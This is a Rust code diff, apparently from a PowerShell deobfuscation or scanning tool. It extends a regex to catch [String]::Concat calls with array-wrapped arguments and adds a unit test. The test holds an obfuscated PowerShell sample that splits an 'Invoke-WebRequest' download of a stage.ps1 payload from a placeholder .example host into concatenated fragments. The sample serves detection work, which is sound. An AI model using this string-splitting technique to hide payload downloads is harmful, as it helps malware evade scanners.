@@ -1085,7 +1085,7 @@ static PS_LITERAL_CONCAT_VAR_RE: Lazy<Regex> =
 #[allow(clippy::expect_used)]
 static PS_LITERAL_STRING_CONCAT_EXTRACTOR_BODY_RE: Lazy<Regex> = Lazy::new(|| {
     Regex::new(
-        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Concat\s*\(\s*((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*\)"#,
+        r#"(?is)(?:\breturn\s+)?\[(?:System\.)?String\]::Concat\s*\(\s*(?:@?\(\s*)?((?:\$[A-Za-z_][A-Za-z0-9_]*\s*,\s*){1,7}\$[A-Za-z_][A-Za-z0-9_]*)\s*(?:\))?\s*\)"#,
     )
     .expect("ps literal string concat extractor body regex")
 });
@@ -10315,6 +10315,23 @@ Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-s
                 "'Invoke-WebRequest -Uri https://ps-string-concat-named-extractor.example/stage.ps1'"
             ),
             "named-argument [string]::Concat extractor call was not rewritten:\n{out}"
+        );
+    }
+
+    #[test]
+    fn literal_string_concat_array_extractor_named_args_call_is_rewritten() {
+        let text = r#"function Join-Text($left,$middle,$right) {
+  return [System.String]::Concat(@($left,$middle,$right))
+}
+Join-Text -right '.example/stage.ps1' -left 'Invoke-WebRequest -Uri https://ps-string-concat-array-named' -middle '-extractor'"#;
+
+        let out = expand_literal_concat_extractor_calls(text);
+
+        assert!(
+            out.contains(
+                "'Invoke-WebRequest -Uri https://ps-string-concat-array-named-extractor.example/stage.ps1'"
+            ),
+            "named-argument [string]::Concat array extractor call was not rewritten:\n{out}"
         );
     }
 
